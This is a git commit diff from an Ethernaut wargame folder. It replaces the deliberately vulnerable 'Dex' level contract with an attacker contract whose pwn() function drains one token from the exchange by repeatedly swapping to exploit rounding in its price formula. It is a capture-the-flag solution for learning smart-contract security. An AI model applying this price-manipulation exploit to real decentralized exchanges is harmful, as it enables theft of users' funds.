f07a1a51f64f08e3c8d2c5251611446d108b2a60
465326302 <465326302@qq.com>
2023-02-21 21:18:30 +0800

    结束

--- Ethernaut/Dex.sol
+++ Ethernaut/Dex.sol
@@ -1,57 +1,59 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
-import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
-import 'openzeppelin-contracts-08/access/Ownable.sol';
 
 
-contract Dex is Ownable {
-  address public token1;
-  address public token2;
-  constructor() {}
+contract Hash {
+    IDex private immutable dex;
+    IERC20 private immutable token1;
+    IERC20 private immutable token2;
+    
+    constructor(IDex _dex) {
+        dex = _dex;
+        token1 = IERC20(dex.token1());
+        token2 = IERC20(dex.token2());
+    }    
 
-  function setTokens(address _token1, address _token2) public onlyOwner {
-    token1 = _token1;
-    token2 = _token2;
-  }
-  
-  function addLiquidity(address token_address, uint amount) public onlyOwner {
-    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
-  }
-  
-  function swap(address from, address to, uint amount) public {
-    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
-    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
-    uint swapAmount = getSwapPrice(from, to, amount);
-    IERC20(from).transferFrom(msg.sender, address(this), amount);
-    IERC20(to).approve(address(this), swapAmount);
-    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
-  }
+    function pwn() external {
+        token1.transferFrom(msg.sender, address(this), 10);
+        token2.transferFrom(msg.sender, address(this), 10);
 
-  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
-    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
-  }
+        token1.approve(address(dex), type(uint256).max);
+        token2.approve(address(dex), type(uint256).max);
 
-  function approve(address spender, uint amount) public {
-    SwappableToken(token1).approve(msg.sender, spender, amount);
-    SwappableToken(token2).approve(msg.sender, spender, amount);
-  }
+        _swap(token1, token2);
+        _swap(token2, token1);
+        _swap(token1, token2);
+        _swap(token2, token1);
+        _swap(token1, token2);
 
-  function balanceOf(address token, address account) public view returns (uint){
-    return IERC20(token).balanceOf(account);
-  }
+        dex.swap(address(token2), address(token1), 45);
+
+        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
+    }
+
+    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
+        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
+    }
 }
 
-contract SwappableToken is ERC20 {
-  address private _dex;
-  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
-        _mint(msg.sender, initialSupply);
-        _dex = dexInstance;
-  }
+interface IDex {
+    function token1() external view returns (address);
+    function token2() external view returns (address);
+    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
+    function swap(address from, address to, uint256 amount) external;
+}
 
-  function approve(address owner, address spender, uint256 amount) public {
-    require(owner != _dex, "InvalidApprover");
-    super._approve(owner, spender, amount);
-  }
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount) external returns (bool);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 }
